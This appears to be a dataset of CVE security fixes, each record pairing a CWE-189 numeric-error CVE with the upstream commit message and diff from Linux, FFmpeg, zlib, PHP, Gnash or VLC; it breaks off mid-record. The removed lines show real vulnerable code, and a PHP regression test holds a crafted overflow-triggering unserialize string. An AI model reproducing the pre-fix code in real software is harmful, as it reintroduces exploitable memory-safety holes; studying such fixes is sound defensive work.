[
  {"CVE_ID":"CVE-2014-2851",
  "CWE_ID":"189",
  "category":"security",
  "commit_id":"b04c46190219a4f845e46a459e3102137b7f6cac",
  "commit_message":"From b04c46190219a4f845e46a459e3102137b7f6cac Mon Sep 17 00:00:00 2001\nFrom: \"Wang, Xiaoming\" <xiaoming.wang@intel.com>\nDate: Mon, 14 Apr 2014 12:30:45 -0400\nSubject: net: ipv4: current group_info should be put after using.\n\nPlug a group_info refcount leak in ping_init.\ngroup_info is only needed during initialization and\nthe code failed to release the reference on exit.\nWhile here move grabbing the reference to a place\nwhere it is actually needed.\n\nSigned-off-by: Chuansheng Liu <chuansheng.liu@intel.com>\nSigned-off-by: Zhang Dongxing <dongxing.zhang@intel.com>\nSigned-off-by: xiaoming wang <xiaoming.wang@intel.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv4\/ping.c | 15 +++++++++++----\n 1 file changed, 11 insertions(+), 4 deletions(-)\n\n",
  "diff_code":"diff --git a\/net\/ipv4\/ping.c b\/net\/ipv4\/ping.c\nindex f4b19e5dde54..8210964a9f19 100644\n--- a\/net\/ipv4\/ping.c\n+++ b\/net\/ipv4\/ping.c\n@@ -252,26 +252,33 @@ int ping_init_sock(struct sock *sk)\n {\n \tstruct net *net = sock_net(sk);\n \tkgid_t group = current_egid();\n-\tstruct group_info *group_info = get_current_groups();\n-\tint i, j, count = group_info->ngroups;\n+\tstruct group_info *group_info;\n+\tint i, j, count;\n \tkgid_t low, high;\n+\tint ret = 0;\n \n \tinet_get_ping_group_range_net(net, &low, &high);\n \tif (gid_lte(low, group) && gid_lte(group, high))\n \t\treturn 0;\n \n+\tgroup_info = get_current_groups();\n+\tcount = group_info->ngroups;\n \tfor (i = 0; i < group_info->nblocks; i++) {\n \t\tint cp_count = min_t(int, NGROUPS_PER_BLOCK, count);\n \t\tfor (j = 0; j < cp_count; j++) {\n \t\t\tkgid_t gid = group_info->blocks[i][j];\n \t\t\tif (gid_lte(low, gid) && gid_lte(gid, high))\n-\t\t\t\treturn 0;\n+\t\t\t\tgoto out_release_group;\n \t\t}\n \n \t\tcount -= cp_count;\n \t}\n \n-\treturn -EACCES;\n+\tret = -EACCES;\n+\n+out_release_group:\n+\tput_group_info(group_info);\n+\treturn ret;\n }\n EXPORT_SYMBOL_GPL(ping_init_sock);\n \n-- \ncgit 1.2-0.3.lf.el7\n\n",
  "owner":"torvalds",
  "repo":"linux",
  "source":"cve"},
  {"CVE_ID":"CVE-2013-0859","CWE_ID":"189","category":"security","commit_id":"6d1c5ea04af3e345232aa70c944de961061dab2d","commit_message":"From 6d1c5ea04af3e345232aa70c944de961061dab2d Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 9 Nov 2012 12:13:30 +0100\nSubject: [PATCH] tiffdec: check count in metadata reading.\n\nFixes out of array access\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/tiff.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/tiff.c b\/libavcodec\/tiff.c\nindex 5d9f80105e..45c247694e 100644\n--- a\/libavcodec\/tiff.c\n+++ b\/libavcodec\/tiff.c\n@@ -254,7 +254,7 @@ static int add_doubles_metadata(int count,\n     int i;\n     double *dp;\n \n-    if (count >= INT_MAX \/ sizeof(int64_t))\n+    if (count >= INT_MAX \/ sizeof(int64_t) || count <= 0)\n         return AVERROR_INVALIDDATA;\n     if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int64_t))\n         return AVERROR_INVALIDDATA;\n@@ -280,7 +280,7 @@ static int add_shorts_metadata(int count, const char *name,\n     int i;\n     int16_t *sp;\n \n-    if (count >= INT_MAX \/ sizeof(int16_t))\n+    if (count >= INT_MAX \/ sizeof(int16_t) || count <= 0)\n         return AVERROR_INVALIDDATA;\n     if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int16_t))\n         return AVERROR_INVALIDDATA;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0844","CWE_ID":"189","category":"security","commit_id":"f18c873ab5ee3c78d00fdcc2582b39c133faecb4","commit_message":"From f18c873ab5ee3c78d00fdcc2582b39c133faecb4 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Wed, 12 Dec 2012 17:14:32 +0100\nSubject: [PATCH] adpcm: fix off by 1 error and out of array access in DK4\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/adpcm.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/adpcm.c b\/libavcodec\/adpcm.c\nindex bf26186d33..cd68257256 100644\n--- a\/libavcodec\/adpcm.c\n+++ b\/libavcodec\/adpcm.c\n@@ -801,7 +801,7 @@ static int adpcm_decode_frame(AVCodecContext *avctx, void *data,\n                 return AVERROR_INVALIDDATA;\n             }\n         }\n-        for (n = nb_samples >> (1 - st); n > 0; n--) {\n+        for (n = (nb_samples - 1) >> (1 - st); n > 0; n--) {\n             int v = bytestream2_get_byteu(&gb);\n             *samples++ = adpcm_ima_expand_nibble(&c->status[0 ], v >> 4  , 3);\n             *samples++ = adpcm_ima_expand_nibble(&c->status[st], v & 0x0F, 3);\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-5707","CWE_ID":"189","category":"security","commit_id":"451a2886b6bf90e2fb378f7c46c655450fb96e81","commit_message":"From 451a2886b6bf90e2fb378f7c46c655450fb96e81 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Sat, 21 Mar 2015 20:08:18 -0400\nSubject: sg_start_req(): make sure that there's not too many elements in iovec\n\nunfortunately, allowing an arbitrary 16bit value means a possibility of\noverflow in the calculation of total number of pages in bio_map_user_iov() -\nwe rely on there being no more than PAGE_SIZE members of sum in the\nfirst loop there.  If that sum wraps around, we end up allocating\ntoo small array of pointers to pages and it's easy to overflow it in\nthe second loop.\n\nX-Coverup: TINC (and there's no lumber cartel either)\nCc: stable@vger.kernel.org # way, way back\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n drivers\/scsi\/sg.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/drivers\/scsi\/sg.c b\/drivers\/scsi\/sg.c\nindex d383f84869aa..b5a4db883223 100644\n--- a\/drivers\/scsi\/sg.c\n+++ b\/drivers\/scsi\/sg.c\n@@ -1744,6 +1744,9 @@ sg_start_req(Sg_request *srp, unsigned char *cmd)\n \t\t\tmd->from_user = 0;\n \t}\n \n+\tif (unlikely(iov_count > MAX_UIOVEC))\n+\t\treturn -EINVAL;\n+\n \tif (iov_count) {\n \t\tint size = sizeof(struct iovec) * iov_count;\n \t\tstruct iovec *iov;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-1175","CWE_ID":"189","category":"security","commit_id":"bb4dc77eecb6ed1b967e3ecbce3dac6c5e6f1527","commit_message":"From bb4dc77eecb6ed1b967e3ecbce3dac6c5e6f1527 Mon Sep 17 00:00:00 2001\nFrom: Benjamin Wolsey <bwy@benjaminwolsey.de>\nDate: Sat, 10 Mar 2012 15:52:50 +0100\nSubject: Fix crash in GnashImage.cpp\n\n---\n libbase\/GnashImage.cpp | 23 +++++++++++++++++++++--\n 1 file changed, 21 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/libbase\/GnashImage.cpp b\/libbase\/GnashImage.cpp\nindex 11c6956..03a6939 100644\n--- a\/libbase\/GnashImage.cpp\n+++ b\/libbase\/GnashImage.cpp\n@@ -26,6 +26,7 @@\n #include <boost\/scoped_array.hpp>\n #include <boost\/shared_ptr.hpp>\n #include <algorithm>\n+#include <cassert>\n \n #ifdef USE_PNG\n # include \"GnashImagePng.h\"\n@@ -44,6 +45,21 @@ namespace image {\n \n namespace {\n     void processAlpha(GnashImage::iterator imageData, size_t pixels);\n+    bool checkValidSize(size_t width, size_t height, size_t channels) {\n+\n+        if (width == 0 || height == 0) return false;\n+\n+        assert(channels > 0);\n+\n+        boost::uint32_t maxSize = std::numeric_limits<boost::int32_t>::max();\n+        if (width >= maxSize || height >= maxSize) return false;\n+\n+        maxSize \/= channels;\n+        maxSize \/= width;\n+        maxSize \/= height;\n+\n+        return maxSize > 0;\n+    }\n }\n \n GnashImage::GnashImage(iterator data, size_t width, size_t height,\n@@ -55,6 +71,8 @@ GnashImage::GnashImage(iterator data, size_t width, size_t height,\n     _height(height),\n     _data(data)\n {\n+    \/\/ Callers should check dimensions\n+    assert(checkValidSize(_width, _height, channels()));\n }\n \n \/\/\/ Create an image allocating a buffer of height*pitch bytes\n@@ -66,8 +84,9 @@ GnashImage::GnashImage(size_t width, size_t height, ImageType type,\n     _width(width),\n     _height(height)\n {\n-    const size_t max = std::numeric_limits<boost::int32_t>::max();\n-    if (size() > max) {\n+    \/\/ Constructed from external input, so restrict dimensions to avoid\n+    \/\/ overflow in size calculations\n+    if (!checkValidSize(_width, _height, channels())) {\n         throw std::bad_alloc();\n     }\n     _data.reset(new value_type[size()]);\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-9843","CWE_ID":"189","category":"security","commit_id":"d1d577490c15a0c6862473d7576352a9f18ef811","commit_message":"From d1d577490c15a0c6862473d7576352a9f18ef811 Mon Sep 17 00:00:00 2001\nFrom: Mark Adler <madler@alumni.caltech.edu>\nDate: Wed, 28 Sep 2016 20:20:25 -0700\nSubject: [PATCH] Avoid pre-decrement of pointer in big-endian CRC calculation.\n\nThere was a small optimization for PowerPCs to pre-increment a\npointer when accessing a word, instead of post-incrementing. This\nrequired prefacing the loop with a decrement of the pointer,\npossibly pointing before the object passed. This is not compliant\nwith the C standard, for which decrementing a pointer before its\nallocated memory is undefined. When tested on a modern PowerPC\nwith a modern compiler, the optimization no longer has any effect.\nDue to all that, and per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.\n---\n crc32.c | 4 +---\n 1 file changed, 1 insertion(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/crc32.c b\/crc32.c\nindex 979a7190..05733f4e 100644\n--- a\/crc32.c\n+++ b\/crc32.c\n@@ -278,7 +278,7 @@ local unsigned long crc32_little(crc, buf, len)\n }\n \n \/* ========================================================================= *\/\n-#define DOBIG4 c ^= *++buf4; \\\n+#define DOBIG4 c ^= *buf4++; \\\n         c = crc_table[4][c & 0xff] ^ crc_table[5][(c >> 8) & 0xff] ^ \\\n             crc_table[6][(c >> 16) & 0xff] ^ crc_table[7][c >> 24]\n #define DOBIG32 DOBIG4; DOBIG4; DOBIG4; DOBIG4; DOBIG4; DOBIG4; DOBIG4; DOBIG4\n@@ -300,7 +300,6 @@ local unsigned long crc32_big(crc, buf, len)\n     }\n \n     buf4 = (const z_crc_t FAR *)(const void FAR *)buf;\n-    buf4--;\n     while (len >= 32) {\n         DOBIG32;\n         len -= 32;\n@@ -309,7 +308,6 @@ local unsigned long crc32_big(crc, buf, len)\n         DOBIG4;\n         len -= 4;\n     }\n-    buf4++;\n     buf = (const unsigned char FAR *)buf4;\n \n     if (len) do {\n","owner":"madler","repo":"zlib","source":"cve"},{"CVE_ID":"CVE-2014-3669","CWE_ID":"189","category":"security","commit_id":"56754a7f9eba0e4f559b6ca081d9f2a447b3f159","commit_message":"From 56754a7f9eba0e4f559b6ca081d9f2a447b3f159 Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Sun, 28 Sep 2014 14:19:31 -0700\nSubject: [PATCH] Fixed bug #68044: Integer overflow in unserialize() (32-bits\n only)\n\n---\n NEWS                                       |  5 ++++-\n ext\/standard\/tests\/serialize\/bug68044.phpt | 12 ++++++++++++\n ext\/standard\/var_unserializer.c            |  4 ++--\n ext\/standard\/var_unserializer.re           |  2 +-\n 4 files changed, 19 insertions(+), 4 deletions(-)\n create mode 100644 ext\/standard\/tests\/serialize\/bug68044.phpt\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex be885ab..e758f35 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -8,12 +8,15 @@ PHP                                                                        NEWS\n - Core:\n   . Fixed bug #67985 (Incorrect last used array index copied to new array after\n     unset). (Tjerk)\n+  . Fixed bug #68044 (Integer overflow in unserialize() (32-bits only)). \n+    (CVE-2014-3669) (Stas)\n \n - OpenSSL:\n   . Reverted fixes for bug #41631, due to regressions. (Stas) \n \n - XMLRPC:\n-  . Fixed bug #68027 (Global buffer overflow in mkgmtime() function). (Stas)\n+  . Fixed bug #68027 (Global buffer overflow in mkgmtime() function). \n+    (CVE-2014-3668) (Stas)\n \n 18 Sep 2014, PHP 5.4.33\n \ndiff --git a\/ext\/standard\/tests\/serialize\/bug68044.phpt b\/ext\/standard\/tests\/serialize\/bug68044.phpt\nnew file mode 100644\nindex 0000000..031e44e\n--- \/dev\/null\n+++ b\/ext\/standard\/tests\/serialize\/bug68044.phpt\n@@ -0,0 +1,12 @@\n+--TEST--\n+Bug #68044 Integer overflow in unserialize() (32-bits only)\n+--FILE--\n+<?php\n+\techo unserialize('C:3:\"XYZ\":18446744075857035259:{}');\n+?>\n+===DONE==\n+--EXPECTF--\n+Warning: Insufficient data for unserializing - %d required, 1 present in %s\/bug68044.php on line 2\n+\n+Notice: unserialize(): Error at offset 32 of 33 bytes in %s\/bug68044.php on line 2\n+===DONE==\ndiff --git a\/ext\/standard\/var_unserializer.c b\/ext\/standard\/var_unserializer.c\nindex 657051f..8129da3 100644\n--- a\/ext\/standard\/var_unserializer.c\n+++ b\/ext\/standard\/var_unserializer.c\n@@ -1,4 +1,4 @@\n-\/* Generated by re2c 0.13.5 on Sat Jun 21 21:27:56 2014 *\/\n+\/* Generated by re2c 0.13.5 *\/\n #line 1 \"ext\/standard\/var_unserializer.re\"\n \/*\n   +----------------------------------------------------------------------+\n@@ -372,7 +372,7 @@ static inline int object_custom(UNSERIALIZE_PARAMETER, zend_class_entry *ce)\n \n \t(*p) += 2;\n \n-\tif (datalen < 0 || (*p) + datalen >= max) {\n+\tif (datalen < 0 || (max - (*p)) <= datalen) {\n \t\tzend_error(E_WARNING, \"Insufficient data for unserializing - %ld required, %ld present\", datalen, (long)(max - (*p)));\n \t\treturn 0;\n \t}\ndiff --git a\/ext\/standard\/var_unserializer.re b\/ext\/standard\/var_unserializer.re\nindex 1307508..6de1583 100644\n--- a\/ext\/standard\/var_unserializer.re\n+++ b\/ext\/standard\/var_unserializer.re\n@@ -376,7 +376,7 @@ static inline int object_custom(UNSERIALIZE_PARAMETER, zend_class_entry *ce)\n \n \t(*p) += 2;\n \n-\tif (datalen < 0 || (*p) + datalen >= max) {\n+\tif (datalen < 0 || (max - (*p)) <= datalen) {\n \t\tzend_error(E_WARNING, \"Insufficient data for unserializing - %ld required, %ld present\", datalen, (long)(max - (*p)));\n \t\treturn 0;\n \t}\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-2521","CWE_ID":"189","category":"security","commit_id":"fc66c5210ec2539e800e87d7b3a985323c7be96e","commit_message":"From fc66c5210ec2539e800e87d7b3a985323c7be96e Mon Sep 17 00:00:00 2001\nFrom: Stephane Eranian <eranian@google.com>\nDate: Sat, 19 Mar 2011 18:20:05 +0100\nSubject: [PATCH] perf, x86: Fix Intel fixed counters base initialization\n\nThe following patch solves the problems introduced by Robert's\ncommit 41bf498 and reported by Arun Sharma. This commit gets rid\nof the base + index notation for reading and writing PMU msrs.\n\nThe problem is that for fixed counters, the new calculation for\nthe base did not take into account the fixed counter indexes,\nthus all fixed counters were read\/written from fixed counter 0.\nAlthough all fixed counters share the same config MSR, they each\nhave their own counter register.\n\nWithout:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n  242202299 unhalted_core_cycles (0.00% scaling, ena=1000790892, run=1000790892)\n 2389685946 instructions_retired (0.00% scaling, ena=1000790892, run=1000790892)\n      49473 baclears             (0.00% scaling, ena=1000790892, run=1000790892)\n\nWith:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n 2392703238 unhalted_core_cycles (0.00% scaling, ena=1000840809, run=1000840809)\n 2389793744 instructions_retired (0.00% scaling, ena=1000840809, run=1000840809)\n      47863 baclears             (0.00% scaling, ena=1000840809, run=1000840809)\n\nSigned-off-by: Stephane Eranian <eranian@google.com>\nCc: peterz@infradead.org\nCc: ming.m.lin@intel.com\nCc: robert.richter@amd.com\nCc: asharma@fb.com\nCc: perfmon2-devel@lists.sf.net\nLKML-Reference: <20110319172005.GB4978@quad>\nSigned-off-by: Ingo Molnar <mingo@elte.hu>\n---\n arch\/x86\/kernel\/cpu\/perf_event.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kernel\/cpu\/perf_event.c b\/arch\/x86\/kernel\/cpu\/perf_event.c\nindex e8dbe179587fc..ec46eea0c4edd 100644\n--- a\/arch\/x86\/kernel\/cpu\/perf_event.c\n+++ b\/arch\/x86\/kernel\/cpu\/perf_event.c\n@@ -912,7 +912,7 @@ static inline void x86_assign_hw_event(struct perf_event *event,\n \t\thwc->event_base\t= 0;\n \t} else if (hwc->idx >= X86_PMC_IDX_FIXED) {\n \t\thwc->config_base = MSR_ARCH_PERFMON_FIXED_CTR_CTRL;\n-\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0;\n+\t\thwc->event_base = MSR_ARCH_PERFMON_FIXED_CTR0 + (hwc->idx - X86_PMC_IDX_FIXED);\n \t} else {\n \t\thwc->config_base = x86_pmu_config_addr(hwc->idx);\n \t\thwc->event_base  = x86_pmu_event_addr(hwc->idx);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-2596","CWE_ID":"189","category":"security","commit_id":"b4cbb197c7e7a68dbad0d491242e3ca67420c13e","commit_message":"From b4cbb197c7e7a68dbad0d491242e3ca67420c13e Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Tue, 16 Apr 2013 13:45:37 -0700\nSubject: vm: add vm_iomap_memory() helper function\n\nVarious drivers end up replicating the code to mmap() their memory\nbuffers into user space, and our core memory remapping function may be\nvery flexible but it is unnecessarily complicated for the common cases\nto use.\n\nOur internal VM uses pfn's (\"page frame numbers\") which simplifies\nthings for the VM, and allows us to pass physical addresses around in a\ndenser and more efficient format than passing a \"phys_addr_t\" around,\nand having to shift it up and down by the page size.  But it just means\nthat drivers end up doing that shifting instead at the interface level.\n\nIt also means that drivers end up mucking around with internal VM things\nlike the vma details (vm_pgoff, vm_start\/end) way more than they really\nneed to.\n\nSo this just exports a function to map a certain physical memory range\ninto user space (using a phys_addr_t based interface that is much more\nnatural for a driver) and hides all the complexity from the driver.\nSome drivers will still end up tweaking the vm_page_prot details for\nthings like prefetching or cacheability etc, but that's actually\nrelevant to the driver, rather than caring about what the page offset of\nthe mapping is into the particular IO memory region.\n\nAcked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n include\/linux\/mm.h |  2 ++\n mm\/memory.c        | 47 +++++++++++++++++++++++++++++++++++++++++++++++\n 2 files changed, 49 insertions(+)\n\n","diff_code":"diff --git a\/include\/linux\/mm.h b\/include\/linux\/mm.h\nindex e19ff30ad0a2..e2091b88d24c 100644\n--- a\/include\/linux\/mm.h\n+++ b\/include\/linux\/mm.h\n@@ -1611,6 +1611,8 @@ int vm_insert_pfn(struct vm_area_struct *vma, unsigned long addr,\n \t\t\tunsigned long pfn);\n int vm_insert_mixed(struct vm_area_struct *vma, unsigned long addr,\n \t\t\tunsigned long pfn);\n+int vm_iomap_memory(struct vm_area_struct *vma, phys_addr_t start, unsigned long len);\n+\n \n struct page *follow_page_mask(struct vm_area_struct *vma,\n \t\t\t      unsigned long address, unsigned int foll_flags,\ndiff --git a\/mm\/memory.c b\/mm\/memory.c\nindex 13cbc420fead..ba94dec5b259 100644\n--- a\/mm\/memory.c\n+++ b\/mm\/memory.c\n@@ -2393,6 +2393,53 @@ int remap_pfn_range(struct vm_area_struct *vma, unsigned long addr,\n }\n EXPORT_SYMBOL(remap_pfn_range);\n \n+\/**\n+ * vm_iomap_memory - remap memory to userspace\n+ * @vma: user vma to map to\n+ * @start: start of area\n+ * @len: size of area\n+ *\n+ * This is a simplified io_remap_pfn_range() for common driver use. The\n+ * driver just needs to give us the physical memory range to be mapped,\n+ * we'll figure out the rest from the vma information.\n+ *\n+ * NOTE! Some drivers might want to tweak vma->vm_page_prot first to get\n+ * whatever write-combining details or similar.\n+ *\/\n+int vm_iomap_memory(struct vm_area_struct *vma, phys_addr_t start, unsigned long len)\n+{\n+\tunsigned long vm_len, pfn, pages;\n+\n+\t\/* Check that the physical memory area passed in looks valid *\/\n+\tif (start + len < start)\n+\t\treturn -EINVAL;\n+\t\/*\n+\t * You *really* shouldn't map things that aren't page-aligned,\n+\t * but we've historically allowed it because IO memory might\n+\t * just have smaller alignment.\n+\t *\/\n+\tlen += start & ~PAGE_MASK;\n+\tpfn = start >> PAGE_SHIFT;\n+\tpages = (len + ~PAGE_MASK) >> PAGE_SHIFT;\n+\tif (pfn + pages < pfn)\n+\t\treturn -EINVAL;\n+\n+\t\/* We start the mapping 'vm_pgoff' pages into the area *\/\n+\tif (vma->vm_pgoff > pages)\n+\t\treturn -EINVAL;\n+\tpfn += vma->vm_pgoff;\n+\tpages -= vma->vm_pgoff;\n+\n+\t\/* Can we fit all of the mapping? *\/\n+\tvm_len = vma->vm_end - vma->vm_start;\n+\tif (vm_len >> PAGE_SHIFT > pages)\n+\t\treturn -EINVAL;\n+\n+\t\/* Ok, let it rip *\/\n+\treturn io_remap_pfn_range(vma, vma->vm_start, pfn, vm_len, vma->vm_page_prot);\n+}\n+EXPORT_SYMBOL(vm_iomap_memory);\n+\n static int apply_to_pte_range(struct mm_struct *mm, pmd_t *pmd,\n \t\t\t\t     unsigned long addr, unsigned long end,\n \t\t\t\t     pte_fn_t fn, void *data)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-9840","CWE_ID":"189","category":"security","commit_id":"6a043145ca6e9c55184013841a67b2fef87e44c0","commit_message":"From 6a043145ca6e9c55184013841a67b2fef87e44c0 Mon Sep 17 00:00:00 2001\nFrom: Mark Adler <madler@alumni.caltech.edu>\nDate: Wed, 21 Sep 2016 23:35:50 -0700\nSubject: [PATCH] Remove offset pointer optimization in inftrees.c.\n\ninftrees.c was subtracting an offset from a pointer to an array,\nin order to provide a pointer that allowed indexing starting at\nthe offset. This is not compliant with the C standard, for which\nthe behavior of a pointer decremented before its allocated memory\nis undefined. Per the recommendation of a security audit of the\nzlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this tiny optimization was removed, in order\nto avoid the possibility of undefined behavior.\n---\n inftrees.c | 18 ++++++++----------\n 1 file changed, 8 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/inftrees.c b\/inftrees.c\nindex 22fcd666..0d2670d5 100644\n--- a\/inftrees.c\n+++ b\/inftrees.c\n@@ -54,7 +54,7 @@ unsigned short FAR *work;\n     code FAR *next;             \/* next available space in table *\/\n     const unsigned short FAR *base;     \/* base value table to use *\/\n     const unsigned short FAR *extra;    \/* extra bits table to use *\/\n-    int end;                    \/* use base and extra for symbol > end *\/\n+    unsigned match;             \/* use base and extra for symbol >= match *\/\n     unsigned short count[MAXBITS+1];    \/* number of codes of each length *\/\n     unsigned short offs[MAXBITS+1];     \/* offsets in table for each length *\/\n     static const unsigned short lbase[31] = { \/* Length codes 257..285 base *\/\n@@ -181,19 +181,17 @@ unsigned short FAR *work;\n     switch (type) {\n     case CODES:\n         base = extra = work;    \/* dummy value--not used *\/\n-        end = 19;\n+        match = 20;\n         break;\n     case LENS:\n         base = lbase;\n-        base -= 257;\n         extra = lext;\n-        extra -= 257;\n-        end = 256;\n+        match = 257;\n         break;\n     default:            \/* DISTS *\/\n         base = dbase;\n         extra = dext;\n-        end = -1;\n+        match = 0;\n     }\n \n     \/* initialize state for loop *\/\n@@ -216,13 +214,13 @@ unsigned short FAR *work;\n     for (;;) {\n         \/* create table entry *\/\n         here.bits = (unsigned char)(len - drop);\n-        if ((int)(work[sym]) < end) {\n+        if (work[sym] + 1 < match) {\n             here.op = (unsigned char)0;\n             here.val = work[sym];\n         }\n-        else if ((int)(work[sym]) > end) {\n-            here.op = (unsigned char)(extra[work[sym]]);\n-            here.val = base[work[sym]];\n+        else if (work[sym] >= match) {\n+            here.op = (unsigned char)(extra[work[sym] - match]);\n+            here.val = base[work[sym] - match];\n         }\n         else {\n             here.op = (unsigned char)(32 + 64);         \/* end of block *\/\n","owner":"madler","repo":"zlib","source":"cve"},{"CVE_ID":"CVE-2013-3671","CWE_ID":"189","category":"security","commit_id":"cc0dd86580b3257f22a4981a79eb5fa6804182b6","commit_message":"From cc0dd86580b3257f22a4981a79eb5fa6804182b6 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 30 Apr 2013 20:05:31 +0200\nSubject: [PATCH] avutil\/log: Fix context pointer used for get_category()\n\nFixes calling a random pointer\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n(cherry picked from commit 7edb984dd051b6919d7d8471c70499273f31b0fa)\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavutil\/log.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavutil\/log.c b\/libavutil\/log.c\nindex 700e89fa97..49dd4d1897 100644\n--- a\/libavutil\/log.c\n+++ b\/libavutil\/log.c\n@@ -178,7 +178,7 @@ static void format_line(void *ptr, int level, const char *fmt, va_list vl,\n             if (parent && *parent) {\n                 snprintf(part[0], part_size, \"[%s @ %p] \",\n                          (*parent)->item_name(parent), parent);\n-                if(type) type[0] = get_category(((uint8_t *) ptr) + avc->parent_log_context_offset);\n+                if(type) type[0] = get_category(parent);\n             }\n         }\n         snprintf(part[1], part_size, \"[%s @ %p] \",\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-7010","CWE_ID":"189","category":"security","commit_id":"454a11a1c9c686c78aa97954306fb63453299760","commit_message":"From 454a11a1c9c686c78aa97954306fb63453299760 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Fri, 30 Aug 2013 23:40:47 +0200\nSubject: [PATCH] avcodec\/dsputil: fix signedness in sizeof() comparissions\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/dsputil.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/dsputil.c b\/libavcodec\/dsputil.c\nindex 0161347cc4e..53fd5720cdb 100644\n--- a\/libavcodec\/dsputil.c\n+++ b\/libavcodec\/dsputil.c\n@@ -1931,7 +1931,7 @@ void ff_set_cmp(DSPContext* c, me_cmp_func *cmp, int type){\n \n static void add_bytes_c(uint8_t *dst, uint8_t *src, int w){\n     long i;\n-    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){\n+    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){\n         long a = *(long*)(src+i);\n         long b = *(long*)(dst+i);\n         *(long*)(dst+i) = ((a&pb_7f) + (b&pb_7f)) ^ ((a^b)&pb_80);\n@@ -1956,7 +1956,7 @@ static void diff_bytes_c(uint8_t *dst, const uint8_t *src1, const uint8_t *src2,\n         }\n     }else\n #endif\n-    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){\n+    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){\n         long a = *(long*)(src1+i);\n         long b = *(long*)(src2+i);\n         *(long*)(dst+i) = ((a|pb_80) - (b&pb_7f)) ^ ((a^b^pb_80)&pb_80);\n","owner":"FFmpeg","repo":"FFmpeg","source":"cve"},{"CVE_ID":"CVE-2010-3907","CWE_ID":"189","category":"security","commit_id":"6568965770f906d34d4aef83237842a5376adb55","commit_message":"From 6568965770f906d34d4aef83237842a5376adb55 Mon Sep 17 00:00:00 2001\nFrom: =?utf8?q?R=C3=A9mi=20Denis-Courmont?= <remi@remlab.net>\nDate: Wed, 15 Dec 2010 00:08:59 +0200\nSubject: [PATCH] Real: fix heap buffer overflow (CVE-2010-3907)\n\nMalformatted files may have a zero i_subpackets value. In this case,\nwe cannot use the array, but we still have to free it (calloc(0)).\n\nThis should fix LP#690173.\n\nReported-by: Dan Rosenberg <drosenberg@vsecurity.com>\n---\n modules\/demux\/real.c | 21 +++++++++++----------\n 1 file changed, 11 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/modules\/demux\/real.c b\/modules\/demux\/real.c\nindex 511938fd74..3ba0a8653b 100644\n--- a\/modules\/demux\/real.c\n+++ b\/modules\/demux\/real.c\n@@ -251,11 +251,8 @@ static void Close( vlc_object_t 